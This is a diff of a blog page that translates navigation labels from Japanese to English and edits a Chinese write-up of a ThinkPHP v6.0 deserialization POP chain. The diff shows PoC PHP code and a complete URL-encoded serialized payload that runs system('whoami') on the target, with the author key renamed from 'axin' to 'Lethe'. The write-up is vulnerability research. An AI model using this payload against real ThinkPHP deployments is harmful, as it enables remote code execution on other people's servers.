@@ -55,7 +55,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/">ホーム</a>
+            <a class="nav-link" href="/">Home</a>
           </li>
         
           
@@ -63,7 +63,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/archives/">アーカイブ</a>
+            <a class="nav-link" href="/archives/">Archives</a>
           </li>
         
           
@@ -71,7 +71,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/categories/">カテゴリー</a>
+            <a class="nav-link" href="/categories/">Categories</a>
           </li>
         
           
@@ -79,7 +79,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/tags/">タグ</a>
+            <a class="nav-link" href="/tags/">Tags</a>
           </li>
         
           
@@ -87,7 +87,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/about/">本ブログ情報　</a>
+            <a class="nav-link" href="/about/">About</a>
           </li>
         
         
@@ -239,15 +239,15 @@ $this-&gt;data = [&quot;key&quot; =&gt; &quot;whoami&quot;];
 }
 </code></pre><p>除此之外还需要将前面说的<code>table</code>声明为Pivot类对象，从而将两个POP链串联起来。</p>
 <p>第二个POP链调用过程如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030303975.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h3><span id="0x04-poc">0x04 POC</span></h3><p>最终POC如下：</p>
+<h3><span id="0x04-poc">0x04 POC</span></h3><h3><span id="0x04-poc">0x04 POC</span></h3><p>最终POC如下：</p>
 <pre><code class="php">&lt;?php
 
 namespace think\model\concern;
 
 trait Attribute
 {
-    private $data = [&quot;axin&quot; =&gt; &quot;whoami&quot;];
-    private $withAttr = [&quot;axin&quot; =&gt; &quot;system&quot;];
+    private $data = [&quot;Lethe&quot; =&gt; &quot;whoami&quot;];
+    private $withAttr = [&quot;Lethe&quot; =&gt; &quot;system&quot;];
 }
 
 namespace think;
@@ -283,8 +283,9 @@ $b = new Pivot($a);
 echo urlencode(serialize($b));
 </code></pre>
 <p>运行得到payload:</p>
-<pre><code>O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22axin%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22axin%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22axin%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22axin%22%3Bs%3A6%3A%22system%22%3B%7D%7D
-</code></pre><p>结果如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030648728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<pre><code>O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22Lethe%22%3Bs%3A6%3A%22system%22%3B%7D%7D
+</code></pre><p>结果如下：<br><img src="/2020/04/26/ThinkPHPv6-0-unserialize/20200427030648728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><br></p>
 <h3><span id="0x05-后记">0x05 后记</span></h3><p>第一次对ThinkPHP框架进行真实漏洞的审计，参考着大佬们的分析文章才弄明白了。其实一步一步理解这个反序列化漏洞的流程并不是特别困难，主要还是自己对ThinkPHP框架不熟悉、对PHP命名空间的概念也不是特别清晰，导致在编写POC的过程中遇到了些问题。之前一直处于只做CTF题目的状态，以后还是得要多做做代码审计，找个时间把thinkphp手册过一遍吧，tcl。</p>
 
             <hr>
@@ -320,7 +321,7 @@ echo urlencode(serialize($b));
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;ディレクトリ</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
     <div id="tocbot"></div>
   </div>
 
@@ -377,7 +378,7 @@ echo urlencode(serialize($b));
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">検索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -385,7 +386,7 @@ echo urlencode(serialize($b));
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">キーワード</label>
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
